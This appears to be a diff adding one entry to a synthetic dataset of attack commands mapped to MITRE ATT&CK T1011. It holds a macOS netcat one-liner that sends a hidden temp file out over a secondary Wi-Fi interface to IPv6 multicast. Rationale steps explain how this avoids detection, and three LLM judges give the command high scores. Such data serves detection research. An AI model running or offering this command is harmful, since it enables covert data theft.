@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -u -s \"$(ipconfig getv6ifaddr llw0)\" \"ff02::1%llw0\" 54901 < /tmp/.z",
+  "explanation": "Uses the low-latency Wi‑Fi interface (llw0) to transmit to the all-nodes IPv6 multicast group on a high, uncommon UDP port, exploiting a secondary wireless medium per T1011.",
+  "rationale_steps": [
+    "Query ipconfig for the IPv6 address on llw0 to ensure traffic egresses over the low-latency Wi‑Fi medium.",
+    "Bind the sender to that address and target a link-local multicast scope.",
+    "Transmit data over an uncommon UDP port to minimize signature-based detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-63e108fb",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with valid BSD nc flags, balanced quoting, proper destination/port, and correct input redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates via the llw0 wireless medium using IPv6 UDP multicast per T1011, though dependence on llw0 being active and potential link-local scoping quirks for -s introduce minor realism gaps.",
+        "combined_score": 4.5,
+        "confidence": 0.77,
+        "timestamp": "2025-09-30T23:54:19.784447Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid netcat flags, and correct command substitution syntax for obtaining the IPv6 address.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements T1011 by using netcat to exfiltrate data over a secondary Wi-Fi interface (llw0) to a multicast address on an uncommon UDP port, bypassing potential monitoring on the primary network.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-09-30T23:54:23.713990Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command substitution, and proper redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully achieves the claimed intent by using `nc` to transmit a file over UDP multicast on a specific IPv6 interface (`llw0`) on macOS, directly aligning with the T1011 technique for exfiltration over a secondary wireless medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-09-30T23:54:34.563782Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
